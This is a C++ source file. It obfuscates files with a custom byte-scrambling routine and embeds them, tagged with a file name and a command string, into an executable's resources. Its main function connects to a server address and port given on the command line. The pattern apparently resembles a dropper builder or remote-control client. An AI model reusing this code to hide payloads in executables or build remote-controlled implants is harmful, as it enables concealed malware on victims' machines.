#include <iostream>
#include <thread>
#include "socket_manager.h"

struct ResourceInfo
{
	wchar_t* path;
	LPCWSTR filename;
	LPCWSTR commandStr;
	int index;
};

unsigned char chnbit(unsigned char c)
{
	return (c >> 4) | (c << 4);
}
unsigned char _rol(unsigned char c, unsigned int num)
{
	return (c << num) | (c >> (8 - num));
}
unsigned char _ror(unsigned char c, unsigned int num)
{
	return (c >> num) | (c << (8 - num));
}

void myencrypt(unsigned char* input, unsigned char* output, int len)
{
	int j = 0;
	for (int i = 0; i < len; i++)
	{
		output[len - i - 1] = input[i];
		output[len - i - 1] = chnbit(output[len - i - 1]);
		output[len - i - 1] = _ror(output[len - i - 1], (3 + i) % 8);
		output[len - i - 1] ^= 0x92 + i % 256;
	}
}


bool ImportResource(HANDLE pRes, wchar_t* ImportFile, wchar_t* pFileName, wchar_t* pCommand, unsigned int ret)
{
	bool retn = true;
	FILE* fp = NULL;
	_wfopen_s(&fp, ImportFile, L"rb");
	if (fp)
	{
		fseek(fp, 0, SEEK_END);
		unsigned int filesize = ftell(fp);
		rewind(fp);
		char* buffer = new char[filesize + MAX_PATH * sizeof(wchar_t)];
		//wchar_t *filename = L"ClientSearch-x64.exe";
		if (fread((void*)((SIZE_T)buffer + MAX_PATH * sizeof(wchar_t)), 1, filesize, fp) == filesize)
		{
			wchar_t newfilename[MAX_PATH];
			wcscpy_s(newfilename, MAX_PATH, pFileName);
			wcscat_s(newfilename, MAX_PATH, L"|");
			wcscat_s(newfilename, MAX_PATH, pCommand);
			memcpy(buffer, newfilename, MAX_PATH * sizeof(wchar_t));
			char* encrypted = new char[filesize + MAX_PATH * sizeof(wchar_t)];
			myencrypt((unsigned char*)buffer, (unsigned char*)encrypted, filesize + MAX_PATH * sizeof(wchar_t));
			UpdateResource(pRes, RT_RCDATA, MAKEINTRESOURCE(ret), MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), encrypted, filesize + MAX_PATH * sizeof(wchar_t));
			delete[] encrypted;
		}
		else
			retn = false;
		delete[] buffer;
		fclose(fp);
	}
	else
		retn = false;
	return retn;
}

void ImportResourceIfExists(HANDLE hRes, wchar_t* filePath, const wchar_t* resourceName, wchar_t* commandStr, int resourceId)
{
	if (!_waccess(filePath, 00))
	{
		wchar_t filename[MAX_PATH];
		wcscpy_s(filename, MAX_PATH, resourceName);
		if (!ImportResource(hRes, filePath, filename, commandStr, resourceId))
		{
			printf("Error importing resource: %s\n", resourceName);
		}
	}
	else
	{
		printf("File does not exist: %d\n", resourceId);
	}
}


int main(int argc, char* argv[]) {

    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <serverIP> <port>" << std::endl;
        return 1;
    }
    std::string serverIP = argv[1];
    int port = std::stoi(argv[2]);

    Info* info = new Info();
    SocketSend* socketsend = new SocketSend(info);
    SocketManager socketManager(serverIP, port, info, socketsend);




    

    while (true) {};
}